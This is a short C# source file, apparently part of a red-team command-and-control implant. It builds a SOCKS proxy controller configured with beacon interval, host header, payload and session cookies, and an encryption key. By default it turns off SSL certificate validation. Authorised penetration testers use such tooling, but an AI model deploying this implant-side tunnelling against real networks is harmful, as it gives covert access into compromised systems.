using Common.Encryption.SimpleEncryptor;
using ImplantSide.Classes;
using ImplantSide.Classes.Socks;
using ImplantSide.Interfaces;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Security;
using System.Text;
using System.Threading.Tasks;

namespace SocksProxy.Classes.Integration
{
    public static class PoshCreateProxy
    {
        
        public static SocksController CreateSocksController(Uri serverUri, String commandChannelId, String HostHeader, String userAgent, SecureString key, List<String> urlPaths, String sessionCookieName, String payloadCookieName, IWebProxy wbProxy = null, short beaconTime = 5000, IImplantLog implantcomms = null, bool sslFullValidation = false)
        {

            IImplantLog icomms = implantcomms ?? new PoshDefaultImplantComms();
            var config = new SocksClientConfiguration
            {
                CommandChannelSessionId = commandChannelId,
                BeaconTime = beaconTime,
                UserAgent = userAgent,
                CommandServerUI = serverUri,
                UseProxy = (null != wbProxy),
                WebProxy = wbProxy,
                URLPaths = urlPaths,
                ImplantComms = icomms,
                HostHeader  = HostHeader,
                PayloadCookieName = payloadCookieName,
                SessionCookieName = sessionCookieName,
                //By Default SSL Validation is disabled this is to aid intitial testing 
                //of the deployed infrastructure before a Production Release. 
                //It is reccomended that this is enabled before deploying to a full Scenario.
                SSLFullValidation = sslFullValidation
            };

            if (null == key)
                throw new Exception("Encryption key is null");

            var socks = new SocksController(config)
            {
                Encryptor = new DebugSimpleEncryptor(key),
                ImplantComms = icomms
            };
            socks.Initialize();
            return socks;
        }
    }
}
